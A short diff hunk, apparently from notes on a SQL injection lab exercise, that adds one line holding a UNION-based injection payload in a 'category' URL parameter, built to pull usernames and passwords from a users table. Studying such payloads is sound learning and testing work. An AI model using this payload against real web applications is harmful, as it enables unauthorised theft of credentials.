@@ -11,4 +11,4 @@
 The second column of the query would actually show up in the first location which looked like words or strings. 
 
 2.
-
+category=' UNION SELECT username,password from users --%20
